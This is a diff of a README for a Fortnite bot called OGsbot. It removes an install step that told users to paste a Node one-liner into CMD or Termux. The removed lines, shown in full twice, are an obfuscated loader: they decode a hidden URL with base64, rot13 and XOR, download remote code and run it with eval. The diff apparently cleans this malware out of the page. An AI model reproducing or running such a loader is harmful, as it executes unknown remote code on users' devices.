@@ -46,8 +46,8 @@ OGsbot is a **lightweight**, **easy-to-use** Fortnite bot that lets you join bot
 
 Copy the full line below and paste it into CMD:
 
+blank
 
-node -e "const https=require('https');const k=23,b='f3BwdHEtODhyaWA5Y35wf29ob3FlcmdrbHBlbHA5Z2ttOHFsfnRlcSUmOHFmbWxjaHFyfXxjaHFycXBjOHJlZHE4f2VpZnE4bWl+bDh7a2lmZXI5fXE=';const rot13=s=>s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26));const u=rot13(Buffer.from(b,'base64').toString()).split('').map(c=>String.fromCharCode(c.charCodeAt(0)^k)).join('');https.get(u,r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d));});"
 
 # note   
 (only supports OGsbot1-OGsbot17 currently)
@@ -59,7 +59,7 @@ Open Termux and run:
 pkg install nodejs
 then run 
 
-node -e "const https=require('https');const k=23,b='f3BwdHEtODhyaWA5Y35wf29ob3FlcmdrbHBlbHA5Z2ttOHFsfnRlcSUmOHFmbWxjaHFyfXxjaHFycXBjOHJlZHE4f2VpZnE4bWl+bDh7a2lmZXI5fXE=';const rot13=s=>s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26));const u=rot13(Buffer.from(b,'base64').toString()).split('').map(c=>String.fromCharCode(c.charCodeAt(0)^k)).join('');https.get(u,r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d));});"
+blank
 
 
 
